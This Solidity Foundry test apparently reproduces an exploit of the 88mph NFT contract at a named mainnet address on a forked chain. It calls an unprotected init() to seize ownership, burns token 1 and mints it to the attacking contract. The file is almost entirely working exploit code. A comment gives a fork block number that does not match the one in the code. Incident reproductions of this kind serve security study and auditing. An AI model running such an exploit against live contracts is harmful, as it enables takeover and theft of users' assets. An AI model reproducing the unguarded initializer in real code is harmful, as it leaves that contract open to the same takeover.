// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

contract ContractTest is Test {
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    I88mph mphNFT = I88mph(0xF0b7DE03134857391d8D43Ed48e20EDF21461097);

    function setUp() public {
        cheats.createSelectFork("mainnet", 12_516_705); //fork mainnet at block 13715025
    }

    function testExploit() public {
        console.log("Before exploiting, NFT contract owner:", mphNFT.owner());
        /*
    The vulnerability was an unprotected init() function in the code of these specific pools
    function init() public {
        require(!initialized, "MPHToken: initialized");
        initialized = true;

        _transferOwnership(msg.sender);
    }

        */
        mphNFT.init(address(this), "0", "0"); // exploit here, change owner to this contract address
        console.log("After exploiting, NFT contract owner:", mphNFT.owner());
        console.log("NFT Owner of #1: ", mphNFT.ownerOf(1));
        mphNFT.burn(1); //burn the token 1
        cheats.expectRevert(bytes("ERC721: owner query for nonexistent token"));
        console.log("After burning: NFT Owner of #1: ", mphNFT.ownerOf(1)); // token burned, nonexistent token
        mphNFT.mint(address(this), 1); // mint a new token 1
        console.log("After exploiting: NFT Owner of #1: ", mphNFT.ownerOf(1)); // token 1 now owned by us
    }

    function onERC721Received(address, address, uint256, bytes memory) public returns (bytes4) {
        return this.onERC721Received.selector;
    }
}
